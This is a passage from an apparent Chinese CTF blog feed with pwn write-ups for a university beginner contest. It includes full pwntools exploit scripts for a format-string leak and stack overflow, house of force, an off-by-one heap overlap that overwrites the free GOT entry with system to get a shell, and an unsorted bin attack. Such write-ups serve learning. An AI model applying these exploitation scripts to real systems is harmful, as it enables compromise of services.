plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p><p>泄露出libc基地址，修改got表，最后get_shell</p></blockquote><p>毕竟一开始做堆题，上来先分析，尽量详细点</p><blockquote><p>add函数</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png" alt="image-20201219204952738"></p><p>其中数据结构为</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png" alt="image-20201219205027638"></p><p>change函数</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png" alt="image-20201219205113774"></p></blockquote><p>直接看exp分析吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>先说一下思路</p><ul><li>单字节溢出，我们可以通过修改chunk_size来overlap，达到任意读写的目的</li><li>由于后门函数没有，所以我们就应该想调用system函数，首要的就是泄露libc基址，其次获取system函数</li><li>改free的got表 达到调用</li></ul><p>这里来写一下exp的思路</p><ol><li>先申请两个堆块，之后修改第一个堆块，第一个堆块可以写入/bin/sh的参数，然后我们修改第二个堆块的size，使其进入fastbin中，让我们再次分配</li><li>我们进行重新分配，这是就可以任意写，把got表中的free写进去，然后读出来，泄露基址</li><li>修改free的got表为system的地址然后直接free(0)也就调用了/bin/sh</li></ol><p>下面是关键截图</p><p>写入/bin/sh</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png" alt="image-20201220211422639"></p><p>释放1之后</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png" alt="image-20201220211752814"></p></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>这里说一下我自己的问题</p><p>我一直认为fakechunk被释放后进入fastbin中，我一直认为fastbin中只有一个chunk</p><p>知道我惊人地发现它居然是free了两回是两个chunk </p><p>我才醒悟</p><p>为什么它不直接从top chunk中分配（我个fw，盯着看了两个小时也没看出来）</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png" alt="image-20201220223150743"></p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png" alt="image-20201220223239931"></p><p>总结，自己总是在自己想这个堆怎么运行，很少去调试。还是应该多动手（要不是我调试能力不太行）</p><h1 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h1><blockquote><p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p><p>关于unsorted bin attack可以参考这篇文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h1><blockquote><p>add申请的时候,如果size不符合条件,会返回,而edit的时候,没有检测,所以通过残留信息来控制指针,实现</p><p>任意写</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;复现&quot;&gt;&lt;a href=&quot;#复现&quot; class=&quot;headerlink&quot; title=&quot;复现&quot;&gt;&lt;/a&gt;复现&lt;/h1&gt;&lt;p&gt;终于考完试了，这考前学真不是人干的，上课还是得听一听&lt;/p&gt;
&lt;p&gt;复现一下这几道题，顺便学习堆的知识&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;淦 我是fw</summary>
      
    
    
    
    <category term="复现" scheme="https://pz1o.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="堆" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
    <category term="复现" scheme="https://pz1o.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020入门赛</title>
    <link href="https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/11/28/CUMT2020%E5%85%A5%E9%97%A8%E8%B5%9B/</id>
    <published>2020-11-28T10:20:47.000Z</published>
    <updated>2020-11-28T12:46:19.100Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="CUMT2020入门赛"><a href="#CUMT2020入门赛" class="headerlink" title="CUMT2020入门赛"></a>CUMT2020入门赛</h1><p>本不准备写的，主要tcl，还是留个坑位等考完试来复现</p><p>主要对堆不理解，并且不懂漏洞利用点在哪里</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>nc连接拿flag</p><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwnlib <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> process</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> make_packer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = make_packer(word_size=<span class="number">64</span>)</span><br><span class="line">bd = <span class="number">0x400756</span></span><br><span class="line"><span class="comment">#r = process("./overflow")</span></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10011</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Welcome to CTF2020!\n'</span>)</span><br><span class="line">r.recvuntil(<span class="string">b'Please input your username\n'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'%11$p'</span>)</span><br><span class="line">pp = r.recv()</span><br><span class="line">print(pp)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b'a'</span>*<span class="number">0x28</span> + p(int(pp, <span class="number">16</span>)) + <span class="string">b'a'</span>*<span class="number">8</span> + p(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><p>栈溢出</p><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><p>整数溢出</p><p>输入65536</p><p>得到shell</p><h3 id="pwn5-fail"><a href="#pwn5-fail" class="headerlink" title="pwn5(fail)"></a>pwn5(fail)</h3><p>先贴exp，考完试来学习</p><p>漏洞点想的是一样的</p><p>但其中有些细节不太懂</p><blockquote><p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p><p>关于house of force不懂得的可以参考这篇文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn6-fail"><a href="#pwn6-fail" class="headerlink" title="pwn6(fail)"></a>pwn6(fail)</h3><blockquote><p>change函数中存在单字节溢出漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>利用单字节溢出漏洞构造fake_chunk,free之后再次分配造成overlap,从而任意地址读写</p><p>泄露出libc基地址，修改got表，最后get_shell</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn7-fail"><a href="#pwn7-fail" class="headerlink" title="pwn7(fail)"></a>pwn7(fail)</h3><blockquote><p>很简单的unsorted bin attack,利用此攻击修改flag为一个很大的数就可以获得shell了</p><p>关于unsorted bin attack可以参考这篇文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    